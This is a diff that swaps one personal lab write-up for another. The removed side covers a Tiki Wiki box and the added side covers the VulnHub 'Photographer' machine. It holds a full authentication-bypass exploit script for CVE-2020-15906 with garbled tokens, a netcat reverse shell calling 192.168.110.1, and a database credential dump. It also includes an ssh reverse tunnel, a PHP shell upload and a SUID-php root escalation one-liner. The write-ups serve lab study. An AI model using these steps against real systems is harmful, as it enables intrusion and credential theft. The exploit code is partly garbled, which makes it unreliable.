@@ -1,220 +1,180 @@
-https://github.com/ivanitlearning/Tiki-Wiki-15.1-unrestricted-file-upload/blob/master/tikiwiki_15.1_RCE.py
 
-https://www.exploit-db.com/exploits/40053
+# Description
 
+<https://www.vulnhub.com/entry/photographer-1,519/>
 
-
-
-```bash
-
-└─$ sudo nmap -sT -A -Pn -n -T4 192.168.110.58
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-24 06:39 CEST
-Nmap scan report for 192.168.110.58
-Host is up (0.00021s latency).
-Not shown: 996 closed ports
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 a3:d8:4a:89:a9:25:6d:07:c5:3d:76:28:06:ed:d1:c0 (RSA)
-|   256 e7:b2:89:05:54:57:dc:02:f4:8c:3a:7c:55:8b:51:aa (ECDSA)
-|_  256 fd:77:07:2b:4a:16:3a:01:6b:e0:00:0c:0a:36:d8:2f (ED25519)
-80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
-| http-robots.txt: 1 disallowed entry 
-|_/tiki/
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-139/tcp open  netbios-ssn Samba smbd 4.6.2
-445/tcp open  netbios-ssn Samba smbd 4.6.2
-MAC Address: 08:00:27:8E:F0:3C (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 4.X|5.X
-OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
-OS details: Linux 4.15 - 5.6
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-|_clock-skew: 1h59m58s
-|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-| smb2-security-mode: 
-|   2.02: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2021-10-24T06:39:12
-|_  start_date: N/A
-
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.22 ms 192.168.110.58
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds
-
-```
+This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.
 
 
-```bash
+# Scan ports
 
-$ enum4linux 192.168.110.58
+    └─$ sudo nmap -sT -A -Pn -n 192.168.110.59
+    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-26 15:09 CEST
+    Nmap scan report for 192.168.110.59
+    Host is up (0.00012s latency).
+    Not shown: 996 closed ports
+    PORT     STATE SERVICE     VERSION
+    80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    |_http-title: Photographer by v1n1v131r4
+    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+    445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+    8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+    |_http-generator: Koken 0.22.24
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    |_http-title: daisa ahomi
+    MAC Address: 08:00:27:40:5C:B0 (Oracle VirtualBox virtual NIC)
+    Device type: general purpose
+    Running: Linux 3.X|4.X
+    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+    OS details: Linux 3.2 - 4.9
+    Network Distance: 1 hop
+    Service Info: Host: PHOTOGRAPHER
 
-$ smbclient //192.168.110.58/Notes -U silky
-Enter WORKGROUP\silky's password:(enter)
-smb: \> get Mail.txt
+    Host script results:
+    |_clock-skew: mean: 1h19m57s, deviation: 2h18m33s, median: -2s
+    |_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+    | smb-os-discovery: 
+    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+    |   Computer name: photographer
+    |   NetBIOS computer name: PHOTOGRAPHER\x00
+    |   Domain name: \x00
+    |   FQDN: photographer
+    |_  System time: 2021-10-26T09:09:41-04:00
+    | smb-security-mode: 
+    |   account_used: guest
+    |   authentication_level: user
+    |   challenge_response: supported
+    |_  message_signing: disabled (dangerous, but default)
+    | smb2-security-mode: 
+    |   2.02: 
+    |_    Message signing enabled but not required
+    | smb2-time: 
+    |   date: 2021-10-26T13:09:42
+    |_  start_date: N/A
 
-└─$ cat Mail.txt   
-Hi Silky
-because of a current Breach we had to change all Passwords,
-please note that it was a 0day, we don't know how he made it.
+    TRACEROUTE
+    HOP RTT     ADDRESS
+    1   0.12 ms 192.168.110.59
 
-Your new CMS-password is now 51lky571k1, 
-please investigate how he made it into our Admin Panel.
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 15.63 seconds
 
-Cheers Boss.
+# Scan samba service
 
-```
+    $ enum4linux 192.168.110.59
 
-Tiki Version 21.1
+     =========================================== 
+    |    Share Enumeration on 192.168.110.59    |
+     =========================================== 
 
-```bash
-curl http://192.168.110.58/tiki/changelog.txt
-
-```
-```bash
-
-└─$ searchsploit tiki 21  
------------------------------------------------------------ ---------------------------------
- Exploit Title                                             |  Path
------------------------------------------------------------ ---------------------------------
-Tiki Wiki CMS Groupware 21.1 - Authentication Bypass       | php/webapps/48927.py
------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results
-
-```
-Script exploit 
-
-```py
-
-#!/usr/bin/env/python3
-import requests
-import json
-import lxml.html
-import sys
-
-banner = '''
-Poof of Concept for CVE-2020-15906 by Maximilian Barz, Twitter: S1lky_1337
-'''
-
-
-
-
-def main():
-    if(len(sys.argv) < 2):
-        print(banner)
-        print("Usage: %s <host> " % sys.argv[0])
-        print("Eg:    %s 1.2.3.4 " % sys.argv[0])
-        return
-
-
-    rhost = sys.argv[1]
-    url = "http://"+rhost+"/tiki/tiki-login.php"
-
-    session = requests.Session()
-
-    def get_ticket():
-        r = requests.get(url)
-        login_page = r.text.encode('utf-8')
-        html = lxml.html.fromstring(login_page)
-        auth = html.xpath('//input[@name="ticket"]/@value')
-
-        return sfürtr(auth)[2:-2]
-
-    def get_cookie():
-        session.get(url)
-        return session.cookies.get_dict()
+            Sharename       Type      Comment
+            ---------       ----      -------
+            print$          Disk      Printer Drivers
+            sambashare      Disk      Samba on Ubuntu
+            IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
 
 
-    cookie = get_cookie()
-    ticket = get_ticket()
+    S-1-22-1-1000 Unix User\daisa (Local User)
+    S-1-22-1-1001 Unix User\agi (Local User)
 
-    payload = {'ticket': ticket,'user':'admin', 'pass':'test','login':'','stay_in_ssl_mode_present':'y','stay_in_ssl_mode':'n'}
-    headers = {
-        'Host': rhost,
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzrhost, deflate',
-        'Referer': 'http://'+rhost+'/tiki/tiki-login.php',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Content-Length': '125',
-        'Connection': 'close',
-        'Upgrade-Insecure-Requests': '1',
-        'Cache-Control': 'max-age=0',
-    }
+## Download smb share
 
+    └─$ smbclient //192.168.110.59/sambashare
 
-    for i in range(60):
-        r = session.post(url, payload, headers)
-        if("Account requires administrator approval." in r.text):
-            print("Admin Password got removed.")
-            print("Use BurpSuite to login into admin without a password ")
+    smb: \> mget *
+
+    cat mail.txt
+
+    Message-ID: <4129F3CA.2020509@dc.edu>
+    Date: Mon, 20 Jul 2020 11:40:36 -0400
+    From: Agi Clarence <agi@photographer.com>
+    User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
+    X-Accept-Language: en-us, en
+    MIME-Version: 1.0
+    To: Daisa Ahomi <daisa@photographer.com>
+    Subject: To Do - Daisa Website's
+    Content-Type: text/plain; charset=us-ascii; format=flowed
+    Content-Transfer-Encoding: 7bit
+
+    Hi Daisa!
+    Your site is ready now.
+    Don't forget your secret, my babygirl ;)
+
+# Scan port 8000
+
+    └─$ nikto -h 192.168.110.59 -port 8000
+    - Nikto v2.1.6
+    ---------------------------------------------------------------------------
+    + Target IP:          192.168.110.59
+    + Target Hostname:    192.168.110.59
+    + Target Port:        8000
+    + Start Time:         2021-10-29 11:13:32 (GMT2)
+    ---------------------------------------------------------------------------
+    + Server: Apache/2.4.18 (Ubuntu)
+    + The anti-clickjacking X-Frame-Options header is not present.
+    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+    + Uncommon header 'x-koken-cache' found, with contents: hit
+    + All CGI directories 'found', use '-C none' to test none
+    + Server may leak inodes via ETags, header found with file /, inode: 1264, size: 5cf45b17a5a00, mtime: gzip
+    + Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+    + Uncommon header 'x-xhr-current-location' found, with contents: http://192.168.110.59/
+    + Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+    + DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+    + OSVDB-3092: /admin/: This might be interesting...
+    + OSVDB-3092: /app/: This might be interesting...
+    + OSVDB-3092: /home/: This might be interesting...
+    + OSVDB-3233: /icons/README: Apache default file found.
+    + /admin/index.html: Admin login page/section found.
+    + /server-status: Apache server-status interface found (protected/forbidden)
+    + 26547 requests: 0 error(s) and 15 item(s) reported on remote host
+    + End Time:           2021-10-29 11:15:09 (GMT2) (97 seconds)
+    ---------------------------------------------------------------------------
+    + 1 host(s) tested
 
 
 
-if(__name__ == '__main__'):
-    main()
+# Found login password to koken
 
-```
+    daisa@photographer.com : babygirl
 
-Reverse shell
+# Search sploit and upload shell
+    
+    $ searchsploit koken 
+    $ searchsploit -m php/webapps/48706.txt
 
-Login as admin --> System Menu --> Scheduler --> Shell command --> mknod backpipe p; nc 192.168.110.1 443 0<backpipe | /bin/bash 1>backpipe --> Run now
+# Reversehell
 
+    http://192.168.110.59:8000/storage/originals/ef/7a/shell.php
 
+# Exploit
 
-```bash
-cat local.php
-<?php
-$db_tiki='mysqli';
-$dbversion_tiki='21.1';
-$host_tiki='localhost';
-$user_tiki='silky';
-$pass_tiki='51lky571k1';
-$dbs_tiki='tikiwiki';
+    $ cat /home/daisa/user.txt
+    d41d8cd98f00b204e9800998ecf8427e
 
+    $ cat ./storage/configuration/database.php
+    <?php
+            return array(
+                    'hostname' => 'localhost',
+                    'database' => 'koken',
+                    'username' => 'kokenuser',
+                    'password' => 'user_password_here',
+                    'prefix' => 'koken_',
+                    'socket' => ''
+            );
+    $
 
-mysql -usilky -p51lky571k1 -hlocalhost tikiwiki -e "show tables" 2>&1
-mysql -usilky -p51lky571k1 -hlocalhost tikiwiki -e "describe users_users" 2>&1
-mysql -usilky -p51lky571k1 -hlocalhost tikiwiki -e "select email, login, hash from users_users" 2>&1
-mysql -usilky -p51lky571k1 -hlocalhost tikiwiki -e "select * from users_users" 2>&1
-mysql -usilky -p51lky571k1 -hlocalhost tikiwiki -e "select valid from users_users" 2>&1
+    mysql -ukokenuser -puser_password_here -hlocalhost koken -e "show tables" 2>&1
+    mysql -ukokenuser -puser_password_here -hlocalhost koken -e "select * from koken_users" 2>&1
 
-mysql -usilky -p51lky571k1 -hlocalhost -e "show databases" 2>&1
-mysql -usilky -p51lky571k1 -hlocalhost Database -e "show tables" 2>&1
+    $ find / -perm -u=s -type f -ls 2>/dev/null
+     3901509   4772 -rwsr-xr-x   1 root     root        4883680 Jul  9  2020 /usr/bin/php7.2
+     
 
-ssh -N -f -R 3306:127.0.0.1:3306 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.110.1 -i key 2>&1
-
-mysqldump -u silky -p  tikiwiki  > tikiwiki.sql
-
-```
-
-Found password silky:Agy8Y7SPJNXQzqA and get root
-
-
-```bash
-
-silky@ubuntu:~$ sudo -l
-[sudo] Passwort für silky: 
-Passende Defaults-Einträge für silky auf ubuntu:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-Der Benutzer silky darf die folgenden Befehle auf ubuntu ausführen:
-    (ALL : ALL) ALL
-silky@ubuntu:~$ sudo su
-root@ubuntu:/home/silky# id
-root@ubuntu:/home/silky# 
-uid=0(root) gid=0(root) Gruppen=0(root)
-
-
-```
+    $ id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    $ php -r "pcntl_exec('/bin/sh', ['-p']);"
+    id
+    uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
